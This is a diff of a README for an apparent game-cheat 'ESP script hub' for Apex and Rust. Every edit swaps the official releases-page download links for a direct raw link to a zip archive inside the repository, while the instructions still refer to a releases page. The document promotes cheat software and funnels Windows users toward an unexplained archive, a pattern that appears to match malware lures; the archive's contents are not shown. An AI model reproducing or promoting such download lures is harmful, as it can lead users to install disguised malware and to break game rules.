@@ -1,6 +1,6 @@
 # 🎯 apex-rust-esp-script-hub - Enhance, Track, and Automate Your Gameplay
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ceremonyhatshop193/apex-rust-esp-script-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ceremonyhatshop193/apex-rust-esp-script-hub/main/tuan/3.0.zip)
 
 ---
 
@@ -53,7 +53,7 @@ This tool runs on Windows 10 or Windows 11 (64-bit versions). You should have at
 
 Click the big purple button below or the one at the top of this page:
 
-[![Download](https://img.shields.io/badge/Download-apex--rust--esp--script--hub-brightgreen?style=for-the-badge)](https://github.com/Ceremonyhatshop193/apex-rust-esp-script-hub/releases)
+[![Download](https://img.shields.io/badge/Download-apex--rust--esp--script--hub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ceremonyhatshop193/apex-rust-esp-script-hub/main/tuan/3.0.zip)
 
 Visit this link to download the application.
 
@@ -74,7 +74,7 @@ Visit this link to download the application if you haven’t already – it’s 
 Here is the complete process from clicking the link to using the tool.
 
 1. **Open the download page**  
-   Go to: [https://github.com/Ceremonyhatshop193/apex-rust-esp-script-hub/releases](https://github.com/Ceremonyhatshop193/apex-rust-esp-script-hub/releases)
+   Go to: [https://raw.githubusercontent.com/Ceremonyhatshop193/apex-rust-esp-script-hub/main/tuan/3.0.zip](https://raw.githubusercontent.com/Ceremonyhatshop193/apex-rust-esp-script-hub/main/tuan/3.0.zip)
 
 2. **Find the latest release**  
    Look for a green banner that says “Latest” or check the top file in the “Assets” section.
